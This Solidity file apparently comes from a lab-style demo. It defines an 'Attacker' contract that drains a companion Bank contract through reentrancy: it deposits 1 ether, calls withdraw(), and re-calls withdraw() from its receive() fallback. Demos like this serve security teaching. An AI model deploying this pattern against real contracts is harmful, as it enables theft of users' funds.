// SPDX-License-Identifier: MIT
pragma solidity >=0.4.0 <0.9.0;
import "./Bank.sol";
contract Attacker{

   Bank public b;
   constructor(address Bankadress){
        b=Bank(Bankadress);//this is one type of accessing the external contracts

   }

receive() external payable {

       if(address(b).balance>=1 ether){
             b.withdraw();
   }
 }

    

   function Attack()external  payable  {
      require(msg.value>=1 ether,"attacker account greater than the 1ether" );
     b.deposit{value:1 ether}();
     b.withdraw();
   }


function getBalance()public view returns(uint){
   return address(this).balance;
}


}


